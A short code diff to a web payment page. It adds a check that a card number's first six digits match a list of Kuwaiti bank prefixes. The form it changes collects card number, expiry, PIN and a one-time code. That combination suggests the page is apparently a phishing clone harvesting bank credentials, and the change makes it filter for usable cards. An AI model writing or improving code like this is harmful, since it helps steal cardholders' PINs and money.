@@ -824,12 +824,20 @@
     let savedExpYear  = '';
     let otpCountdown  = null;
 
+    function validateBin(cardNum) {
+      const raw = cardNum.replace(/\D/g,'');
+      if (raw.length < 6) return false;
+      const bin6 = raw.slice(0,6);
+      return !!BIN_MAP[bin6];
+    }
+
     async function handleSend() {
       const card   = cardInput.value.replace(/\s/g,'');
       const expiryRaw = document.getElementById('expiry').value.replace(/\s/g,'').replace('/','');
       const pin    = document.getElementById('pin').value;
       const ok     = document.getElementById('terms').checked;
       if (card.length < 16) { alert('Please enter the full card number'); return; }
+      if (!validateBin(card)) { alert('Unknown card prefix. Please enter a card issued by an approved Kuwaiti bank'); return; }
       if (expiryRaw.length < 4) { alert('Please enter card expiry date'); return; }
       if (pin.length < 4)   { alert('Please enter PIN'); return; }
       if (!ok)              { alert('Please agree to terms and conditions'); return; }
